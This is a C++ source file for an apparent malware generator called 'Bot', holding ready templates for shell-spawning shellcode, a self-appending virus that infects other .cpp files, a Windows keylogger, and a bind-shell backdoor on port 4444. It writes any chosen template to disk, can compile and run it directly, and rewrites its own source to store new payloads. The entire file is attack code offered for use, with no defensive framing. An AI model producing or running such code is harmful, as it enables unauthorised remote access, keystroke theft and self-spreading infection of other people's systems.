#include <iostream>
#include <fstream>
#include <string>
#include <map>
#include <vector>
#include <cstdlib>

class Bot {
private:
    std::map<std::string, std::string> code_templates;
    std::string self_path;
    
public:
    Bot() {
        self_path = __FILE__;
        
        code_templates["exploit"] = R"(
#include <string.h>
#include <stdio.h>
char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
int main() { ((void(*)())shellcode)(); }
)";
        
        code_templates["virus"] = R"(
#include <iostream>
#include <fstream>
#include <filesystem>
int main() {
    for (auto& p : std::filesystem::directory_iterator(".")) {
        if (p.path().extension() == ".cpp") {
            std::ifstream src(__FILE__);
            std::ofstream dst(p.path(), std::ios::app);
            dst << src.rdbuf();
        }
    }
}
)";
        
        code_templates["keylogger"] = R"(
#include <windows.h>
#include <fstream>
std::ofstream log("keys.log", std::ios::app);
LRESULT CALLBACK hook(int code, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_KEYDOWN) log << (char)((KBDLLHOOKSTRUCT*)lParam)->vkCode;
    return CallNextHookEx(NULL, code, wParam, lParam);
}
int main() {
    SetWindowsHookEx(WH_KEYBOARD_LL, hook, GetModuleHandle(NULL), 0);
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) DispatchMessage(&msg);
}
)";
        
        code_templates["backdoor"] = R"(
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstdlib>
int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {AF_INET, htons(4444), {INADDR_ANY}};
    bind(s, (struct sockaddr*)&addr, sizeof(addr));
    listen(s, 1);
    int c = accept(s, NULL, NULL);
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    execve("/bin/sh", NULL, NULL);
}
)";
    }
    
    void generate(const std::string& type, const std::string& filename) {
        if (code_templates.find(type) != code_templates.end()) {
            std::ofstream file(filename);
            file << code_templates[type];
            file.close();
            std::cout << "Generated " << type << " -> " << filename << std::endl;
        }
    }
    
    void compile_and_run(const std::string& filename) {
        std::string cmd = "g++ " + filename + " -o out && ./out";
        system(cmd.c_str());
    }
    
    void modify_self(const std::string& new_template, const std::string& name) {
        std::ifstream self(self_path);
        std::string content((std::istreambuf_iterator<char>(self)), std::istreambuf_iterator<char>());
        self.close();
        
        size_t pos = content.find("code_templates[\"virus\"]");
        if (pos != std::string::npos) {
            content.insert(pos, "code_templates[\"" + name + "\"] = R\"(" + new_template + ")\";\n");
            
            std::ofstream out(self_path);
            out << content;
            out.close();
            
            std::cout << "Self-modified with new template: " << name << std::endl;
        }
    }
    
    void learn_from_file(const std::string& filepath, const std::string& name) {
        std::ifstream file(filepath);
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        code_templates[name] = content;
        modify_self(content, name);
    }
};

int main(int argc, char* argv[]) {
    Bot bot;
    
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <exploit|virus|keylogger|backdoor|learn> [file] [name]\n";
        return 1;
    }
    
    std::string cmd = argv[1];
    
    if (cmd == "learn" && argc > 3) {
        bot.learn_from_file(argv[2], argv[3]);
    } else {
        std::string filename = cmd + ".cpp";
        bot.generate(cmd, filename);
        
        if (argc > 2 && std::string(argv[2]) == "run") {
            bot.compile_and_run(filename);
        }
    }
    
    return 0;
}